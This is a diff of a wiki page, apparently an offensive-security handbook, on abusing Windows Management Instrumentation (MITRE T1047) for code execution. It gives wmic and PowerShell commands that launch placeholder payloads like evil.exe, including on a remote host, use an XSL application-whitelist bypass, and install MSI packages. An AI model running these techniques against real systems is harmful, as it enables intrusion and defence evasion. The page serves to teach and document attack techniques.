@@ -1,26 +1,18 @@
-# WMIC
+---
+description: MITRE ATT&CK™  Windows Management Instrumentation - Technique T1047
+---
+
+# WMI
 
 ## Theory
 
-Windows Management Instrumentation (WMIC) is a Windows command-line utility that manages Windows components. People found that WMIC is also used to execute binaries for evading defensive measures. We can try to execute binary or XSL file that contain jscript payload with WMIC.
+Windows Management Instrumentation (WMI) provides a standardized way for querying and managing various elements of a Windows operating system. It allow administrators to perform standard management tasks that attackers can abuse to perform code execution.
+
+We can use WMI to execute binary, commands, msi, services, scheduled tasks or XSL file that contain javascript payload with WMIC.
 
 ## Practice
 
 {% tabs %}
-{% tab title="Binary" %}
-Execute local binary (calc.exe)
-
-```bash
-wmic.exe process call create calc
-```
-
-Execute binary on remote system (evil.exe)
-
-```bash
-wmic.exe /node:"192.168.0.1" process call create "evil.exe"
-```
-{% endtab %}
-
 {% tab title="XSL" %}
 Another application whitelist bypassing technique discovered by Casey @subTee, similar to squiblydoo
 
@@ -46,14 +38,54 @@ Invoke wmic command and specify /format pointing to the evil.xsl:
 ```bash
 wmic os get /FORMAT:"evil.xsl"
 ```
+{% endtab %}
 
-Execute binary on remote system (evil.exe)
+{% tab title="Commands" %}
+Execute a local binary or a command using wmic.exe
 
 ```bash
-wmic.exe /node:"192.168.0.1" process call create "evil.exe"
+wmic.exe process call create "C:\Windows\Temp\evil.exe"
+wmic.exe process call create "cmd.exe /c calc.exe"
+```
+
+Or we may use powershell&#x20;
+
+```powershell
+#Execute a command remotely 
+$Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere";
+
+#Powershell v1+
+Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList $Command
+
+#Powershell v3+
+Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = $Command }
+```
+{% endtab %}
+
+{% tab title="MSI" %}
+Install a msi package using wmic.exe
+
+```bash
+wmic product call install PackageLocation=c:\Windows\myinstaller.msi
+```
+
+Or we may use powershell
+
+```powershell
+#Powershell v1+
+Invoke-WmiMethod -Path win32_product -name install -argumentlist @($true,"","C:\Windows\myinstaller.msi")
+
+#Powershell v3+
+Invoke-CimMethod -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
 ```
 {% endtab %}
 {% endtabs %}
+
+You may want to check this page for remote WMI execution :&#x20;
+
+{% content-ref url="../../pivoting/remote-wmi.md" %}
+[remote-wmi.md](../../pivoting/remote-wmi.md)
+{% endcontent-ref %}
 
 ## Resources
 
